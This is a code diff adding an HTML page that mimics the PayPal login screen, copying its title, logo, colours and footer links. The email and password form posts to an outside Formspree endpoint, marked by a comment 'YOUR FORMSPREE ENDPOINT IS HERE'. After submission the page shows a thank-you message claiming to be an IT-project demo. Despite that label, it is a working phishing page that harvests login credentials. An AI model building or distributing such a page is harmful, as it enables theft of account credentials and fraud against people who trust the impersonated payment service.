@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to your PayPal account</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #ffffff;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #2c2c2c;
+        }
+        .container {
+            max-width: 420px;
+            margin: 60px auto;
+            padding: 0 20px;
+            text-align: center;
+        }
+        .logo {
+            font-size: 38px;
+            font-weight: 700;
+            margin-bottom: 40px;
+            color: #003087;
+        }
+        input {
+            width: 100%;
+            padding: 16px 18px;
+            margin: 12px 0;
+            border: 1px solid #c6c6c6;
+            border-radius: 8px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+        .password-wrapper {
+            position: relative;
+        }
+        .toggle {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #0070ba;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .forgot {
+            color: #0070ba;
+            text-align: left;
+            margin: 8px 0 20px;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .login-btn {
+            background: #0070ba;
+            color: white;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            border-radius: 30px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 12px 0;
+        }
+        .or {
+            margin: 25px 0;
+            color: #666;
+            position: relative;
+        }
+        .or::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #ddd;
+        }
+        .or span {
+            background: white;
+            padding: 0 15px;
+        }
+        .signup-btn {
+            background: transparent;
+            color: #0070ba;
+            border: 2px solid #0070ba;
+            padding: 16px;
+            width: 100%;
+            border-radius: 30px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .error {
+            background: #ffebee;
+            color: #d32f2f;
+            padding: 12px;
+            border-radius: 6px;
+            margin: 10px 0;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="mainContent">
+    <div class="logo">PayPal</div>
+
+    <!-- YOUR FORMSPREE ENDPOINT IS HERE -->
+    <form id="loginForm" action="https://formspree.io/f/xkoywvyk" method="POST">
+        <input type="text" name="email" id="email" placeholder="Email or mobile number" required>
+        
+        <div class="password-wrapper">
+            <input type="password" name="password" id="password" placeholder="Password" required>
+            <span class="toggle" id="toggleBtn">Show</span>
+        </div>
+
+        <div id="error" class="error">Some of your info isn't correct. Please try again.</div>
+
+        <div class="forgot" id="forgotLink">Forgot password?</div>
+
+        <button type="submit" class="login-btn">Log In</button>
+    </form>
+
+    <div class="or"><span>or</span></div>
+
+    <button type="button" class="signup-btn" id="signupBtn">Sign Up</button>
+
+    <div style="margin-top:40px; font-size:14px;">🇺🇸 English ▼ &nbsp; Français &nbsp; Español &nbsp; 中文</div>
+
+    <div style="margin-top:30px; font-size:12px; color:#666;">
+        Contact Us &nbsp; Privacy &nbsp; Legal &nbsp; Policy Updates &nbsp; Worldwide
+    </div>
+</div>
+
+<script>
+    // Password Show/Hide
+    document.getElementById('toggleBtn').addEventListener('click', function() {
+        const pw = document.getElementById('password');
+        if (pw.type === 'password') {
+            pw.type = 'text';
+            this.textContent = 'Hide';
+        } else {
+            pw.type = 'password';
+            this.textContent = 'Show';
+        }
+    });
+
+    document.getElementById('forgotLink').addEventListener('click', () => {
+        alert("Forgot password? This would start the reset process in real PayPal.");
+    });
+
+    document.getElementById('signupBtn').addEventListener('click', () => {
+        alert("Sign Up page would open here.");
+    });
+
+    // Show thank you message after submission
+    document.getElementById('loginForm').addEventListener('submit', function() {
+        setTimeout(() => {
+            document.getElementById('mainContent').innerHTML = `
+                <div style="background:#f8f9fa; min-height:100vh; padding:60px 20px; text-align:center;">
+                    <h2 style="color:#0070ba;">Thank You!</h2>
+                    <p>Your login information has been submitted.</p>
+                    <p style="margin-top:30px; color:#666;">This is a demo for an IT project only.</p>
+                    <button onclick="location.reload()" style="background:#0070ba; color:white; border:none; padding:14px 30px; border-radius:30px; margin-top:20px;">Return to Login</button>
+                </div>
+            `;
+        }, 600);
+    });
+</script>
+
+</body>
+</html>
